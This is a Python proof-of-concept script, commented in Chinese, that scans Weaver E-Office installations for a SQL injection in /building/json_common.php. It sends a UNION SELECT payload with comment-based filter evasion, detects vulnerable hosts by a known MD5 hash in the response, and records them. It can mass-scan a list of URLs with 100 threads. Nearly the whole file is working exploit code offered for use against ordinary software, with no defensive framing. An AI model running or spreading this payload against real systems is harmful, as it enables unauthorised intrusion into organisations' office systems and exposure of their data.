# 泛微E-Office json_common.php SQL注入漏洞
# 导包
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错

# 指纹模块
def banner():
    banner = """

███████╗     ██████╗ ███████╗███████╗██╗ ██████╗███████╗             ██╗███████╗ ██████╗ ███╗   ██╗         ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ ██████╗ ███╗   ██╗   ██████╗ ██╗  ██╗██████╗ 
██╔════╝    ██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝             ██║██╔════╝██╔═══██╗████╗  ██║        ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔═══██╗████╗  ██║   ██╔══██╗██║  ██║██╔══██╗
█████╗█████╗██║   ██║█████╗  █████╗  ██║██║     █████╗               ██║███████╗██║   ██║██╔██╗ ██║        ██║     ██║   ██║██╔████╔██║██╔████╔██║██║   ██║██╔██╗ ██║   ██████╔╝███████║██████╔╝
██╔══╝╚════╝██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝          ██   ██║╚════██║██║   ██║██║╚██╗██║        ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║   ██║██║╚██╗██║   ██╔═══╝ ██╔══██║██╔═══╝ 
███████╗    ╚██████╔╝██║     ██║     ██║╚██████╗███████╗███████╗╚█████╔╝███████║╚██████╔╝██║ ╚████║███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██╗██║     ██║  ██║██║     
╚══════╝     ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝╚══════╝ ╚════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝  ╚═╝╚═╝                                                            
                                                                                                                                version:    1.0.0
                                                                                                                                For:        泛微E-Office json_common.php SQL注入漏洞 
"""
    print(banner)

# poc模块
def poc(target):
    url = target+"/building/json_common.php"
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }
    headers1 = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6",
        "Cookie": "LOGIN_LANG=cn; PHPSESSID=7f275c7f8f0f29be7f69a4f33188bf02",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "87",
    }
    data="tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333"
    try:
        res1 = requests.get(target,headers=headers)
        if res1.status_code == 200:
            res2 = requests.post(url=url,headers=headers1,data=data,verify=False)
            if  "6cfe798ba8e5b85feb50164c59f4bec9" in res2.text:
                print("[+]该站点存在泛微E-Office json_common.php SQL注入漏洞,url:"+target)
                with open ('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
            else :
                print("[-]该站点不存在泛微E-Office json_common.php SQL注入漏洞,url:"+target)
                with open ('without-bug.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
        
    except Exception as e:
        print("[!]连接出现问题，请手动进行测试该站点,url="+target)
        with open ('warning.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a testing tool")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()